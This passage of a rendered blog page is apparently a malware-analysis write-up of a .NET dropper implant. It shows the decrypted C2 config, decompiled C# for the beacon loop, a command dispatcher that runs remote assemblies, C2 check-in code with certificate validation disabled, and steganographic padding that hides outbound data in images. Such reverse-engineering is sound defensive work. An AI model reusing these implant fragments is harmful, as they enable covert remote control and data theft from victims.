+<h4 class="relative group">config decryption result
+    <div id="config-decryption-result" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#config-decryption-result" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Running the decryption script against the embedded config produces the following plaintext:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">true;30;60;;;;;TW96aWxsYS81LjAg...;;2999-01-01;1;https://192.168.248.128,;https://192.168.248.128,;;;/vfe01s/1/vsopts.js/?c;;5s;0.2;Qqz6czYCfkrmlba4dF16YLO1vJq13piIlFlN+5o06/g=;;;</span></span></code></pre></div></div>
+<p>parsed config fields:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln"> 1</span><span class="cl">RetriesEnabled        true
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">RetryLimit            30
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">StageWaitTimeMillis   60
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">UserAgent             Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">                      AppleWebKit/537.36 Chrome/80.0.3987.122 Safari/537.36
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">                      (base64 decoded from TW96aWxsYS81LjAg...)
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">KillDate              2999-01-01
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">ImplantId             1
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">StageUrl              https://192.168.248.128
+</span></span><span class="line"><span class="ln">10</span><span class="cl">BeaconCommsUrl        https://192.168.248.128
+</span></span><span class="line"><span class="ln">11</span><span class="cl">URI                   /vfe01s/1/vsopts.js/?c
+</span></span><span class="line"><span class="ln">12</span><span class="cl">BeaconSleep           5s
+</span></span><span class="line"><span class="ln">13</span><span class="cl">Jitter                0.2  (20%)
+</span></span><span class="line"><span class="ln">14</span><span class="cl">Key                   Qqz6czYCfkrmlba4dF16YLO1vJq13piIlFlN+5o06/g=</span></span></code></pre></div></div>
+<ul>
+<li><code>KillDate: 2999-01-01</code> — effectively disabled, implant runs indefinitely</li>
+<li><code>BeaconSleep: 5s</code> with <code>Jitter: 0.2</code> — beacon interval is 5 seconds ±20%, confirms ~40s gap observed in sandbox was due to fake.net retry backoff, not the configured sleep</li>
+<li><code>UserAgent</code> field matches exactly the User-Agent observed in HTTP request during sandbox analysis</li>
+<li><code>Key</code> — AES session key used for encrypting beacon communications (separate from config decryption key)</li>
+<li><code>StageUrl</code> and <code>BeaconCommsUrl</code> both point to <code>192.168.248.128</code> — single C2 server for both staging and ongoing communication</li>
+<li><code>URI: /vfe01s/1/vsopts.js/?c</code> — confirms the exact path observed in sandbox network capture</li>
+</ul>
+
+<h4 class="relative group">Init() → Stage() → CommandLoop() analysis
+    <div id="init--stage--commandloop-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#init--stage--commandloop-analysis" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p><code>Init()</code> — main execution entry point, called after config decryption and validation checks pass. It calls <code>Stage()</code> for initial C2 check-in, then enters <code>CommandLoop()</code> indefinitely</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="ln">1</span><span class="cl"><span class="kd">private</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">Init</span><span class="p">(</span><span class="n">Config</span> <span class="n">config</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="n">IComms</span> <span class="n">comms</span> <span class="p">=</span> <span class="k">new</span> <span class="n">HttpComms</span><span class="p">(</span><span class="n">config</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="n">Program</span><span class="p">.</span><span class="n">_sendData</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Action</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]&gt;(</span><span class="n">comms</span><span class="p">.</span><span class="n">SendTaskOutputBytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="n">Program</span><span class="p">.</span><span class="n">Stage</span><span class="p">(</span><span class="n">config</span><span class="p">,</span> <span class="n">comms</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">    <span class="n">Program</span><span class="p">.</span><span class="n">CommandLoop</span><span class="p">(</span><span class="n">config</span><span class="p">,</span> <span class="n">comms</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p><code>CommandLoop()</code> — main beacon loop, runs until KillDate.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">while</span> <span class="p">(!(</span><span class="n">DateTime</span><span class="p">.</span><span class="n">ParseExact</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">KillDate</span><span class="p">,</span> <span class="s">&#34;yyyy-MM-dd&#34;</span><span class="p">,</span> <span class="p">...)</span> <span class="p">&lt;</span> <span class="n">DateTime</span><span class="p">.</span><span class="n">Now</span><span class="p">))</span></span></span></code></pre></div></div>
+<p>- loop continues as long as current date is before KillDate<br>
+- <code>KillDate: 2999-01-01</code> extracted from config — implant runs indefinitely</p>
+<p><strong>task parsing:</strong></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="ln">1</span><span class="cl"><span class="kt">string</span> <span class="n">text2</span> <span class="p">=</span> <span class="n">text</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">5</span><span class="p">);</span>  <span class="c1">// first 5 chars = task ID</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="kt">string</span> <span class="n">command</span> <span class="p">=</span> <span class="n">text</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="m">5</span><span class="p">);</span>    <span class="c1">// remainder = command string</span></span></span></code></pre></div></div>
+<p>- every command received from C2 is prefixed with a 5-character task ID<br>
+- task ID is used when sending output back to C2 to correlate responses</p>
+<p><strong>batch command support:</strong></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">commands</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;multicmd&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">).</span><span class="n">Split</span><span class="p">(</span><span class="k">new</span> <span class="kt">string</span><span class="p">[]{</span><span class="s">&#34;!d-3dion@LD!-d&#34;</span><span class="p">},</span> <span class="p">...)</span></span></span></code></pre></div></div>
+<p>- <code>multicmd</code> prefix signals multiple commands in a single response
+- <code>!d-3dion@LD!-d</code> is the hardcoded delimiter separating individual commands
+- both strings were identified during static strings analysis</p>
+<p><strong>command dispatcher:</strong></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln"> 1</span><span class="cl">exit                     -&gt; dispose comms, terminate loop
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">run-temp-appdomain       -&gt; execute assembly in isolated temporary AppDomain
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">update-config            -&gt; live reconfiguration via config.Refresh()
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">load-module              -&gt; load Stage2-Core assembly into memory, wire delegates
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">run-dll/exe-background   -&gt; execute assembly in background thread
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">run-dll/exe              -&gt; execute assembly in current thread
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">run-assembly-background  -&gt; run ephemeral assembly in background thread
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">run-assembly             -&gt; run ephemeral assembly in current thread
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">set-delegates            -&gt; rewire Stage2-Core function pointers
+</span></span><span class="line"><span class="ln">10</span><span class="cl">download-file            -&gt; execute via RunCoreAssembly, send output to C2
+</span></span><span class="line"><span class="ln">11</span><span class="cl">beacon                   -&gt; update sleep interval via SLEEP_REGEX parser
+</span></span><span class="line"><span class="ln">12</span><span class="cl">&lt;unknown command&gt;        -&gt; fallback: passed to RunCoreAssembly (all custom modules)</span></span></code></pre></div></div>
+
+<h4 class="relative group">C2 communication layer
+    <div id="c2-communication-layer" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#c2-communication-layer" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Constructor initializes the steganography module <code>ImageDataObfuscator</code> for hiding C2 data inside image payloads, and disables SSL validation via <code>AllowUntrustedCertificates()</code> to allow self-signed certificates on the C2 server.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="ln">1</span><span class="cl"><span class="kd">internal</span> <span class="n">HttpComms</span><span class="p">(</span><span class="n">Config</span> <span class="n">config</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_config</span> <span class="p">=</span> <span class="n">config</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="n">_imageDataObfuscator</span> <span class="p">=</span> <span class="k">new</span> <span class="n">HttpComms</span><span class="p">.</span><span class="n">ImageDataObfuscator</span><span class="p">(</span><span class="n">config</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="n">Utils</span><span class="p">.</span><span class="n">AllowUntrustedCertificates</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p><code>Stage()</code> — initial C2 check-in. Environmental fingerprint is AES-encrypted and sent as <code>SessionID</code> cookie, confirmed by sandbox HTTP capture. C2 URL is constructed from <code>StageCommsChannels</code> key + <code>StageUrl</code> from decrypted config.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="ln">1</span><span class="cl"><span class="kt">string</span> <span class="n">cookie</span> <span class="p">=</span> <span class="n">Encryption</span><span class="p">.</span><span class="n">Encrypt</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">_config</span><span class="p">.</span><span class="n">Key</span><span class="p">,</span> <span class="n">environmentalInfo</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="kt">string</span> <span class="n">address</span> <span class="p">=</span> <span class="n">text</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">_config</span><span class="p">.</span><span class="n">StageUrl</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="n">WebClient</span> <span class="n">webClient</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">GetWebClient</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">hostHeader</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="kt">string</span> <span class="n">base64EncodedCiphertext</span> <span class="p">=</span> <span class="n">webClient</span><span class="p">.</span><span class="n">DownloadString</span><span class="p">(</span><span class="n">address</span><span class="p">);</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">Steganographic payload padding
+    <div id="steganographic-payload-padding" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#steganographic-payload-padding" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p><code>PadWithImageData()</code> disguises outbound C2 data by prepending a real image followed by random noise, making the payload appear as a legitimate image file to network inspection tools.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kd">internal</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">PadWithImageData</span><span class="p">(</span><span class="kt">byte</span><span class="p">[]</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="kt">int</span> <span class="n">num</span> <span class="p">=</span> <span class="n">data</span><span class="p">.</span><span class="n">Length</span> <span class="p">+</span> <span class="m">1500</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="kt">string</span> <span class="n">s</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">_config</span><span class="p">.</span><span class="n">Images</span><span class="p">[</span><span class="k">new</span> <span class="n">Random</span><span class="p">().</span><span class="n">Next</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">_config</span><span class="p">.</span><span class="n">Images</span><span class="p">.</span><span class="n">Count</span><span class="p">)];</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">HttpComms</span><span class="p">.</span><span class="n">ImageDataObfuscator</span><span class="p">.</span><span class="n">RandomString</span><span class="p">(</span><span class="m">1500</span> <span class="p">-</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">));</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">array2</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">num</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">Array</span><span class="p">.</span><span class="n">Copy</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array2</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">Array</span><span class="p">.</span><span class="n">Copy</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array2</span><span class="p">,</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="n">bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">Array</span><span class="p">.</span><span class="n">Copy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array2</span><span class="p">,</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span> <span class="p">+</span> <span class="n">bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">return</span> <span class="n">array2</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>Final payload structure is <code>[image bytes] + [random noise] + [actual data]</code>, total size is always <code>data.Length + 1500</code> bytes. Image is randomly selected from the <code>Images</code> list in decrypted config and base64-decoded. Noise fills the remaining space up to the 1500-byte header using <code>RandomString()</code>.</p>
+<p><code>RandomString()</code> generates noise by sampling random characters from a fixed charset, producing unpredictable but low-entropy padding.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="ln">1</span><span class="cl"><span class="kd">private</span> <span class="kd">static</span> <span class="kt">string</span> <span class="n">RandomString</span><span class="p">(</span><span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="kt">string</span><span class="p">((</span><span class="k">from</span> <span class="n">s</span> <span class="k">in</span> <span class="n">Enumerable</span><span class="p">.</span><span class="n">Repeat</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;(</span><span class="s">&#34;...................@..........................Tyscf&#34;</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="k">select</span> <span class="n">s</span><span class="p">[</span><span class="n">Program</span><span class="p">.</span><span class="n">RANDOM</span><span class="p">.</span><span class="n">Next</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">Length</span><span class="p">)]).</span><span class="n">ToArray</span><span class="p">&lt;</span><span class="kt">char</span><span class="p">&gt;());</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>The fixed charset <code>&quot;...................@..........................Tyscf&quot;</code> was visible as a raw string in the strings analysis at offset <code>0x04B25D81</code>.</p>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/bubka/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_writeups\dropper-cs.exe analysis\index.md"
+          data-oid-likes="likes_writeups\dropper-cs.exe analysis\index.md"></script>
+      
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+
+    
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/bubka/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/bubka/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
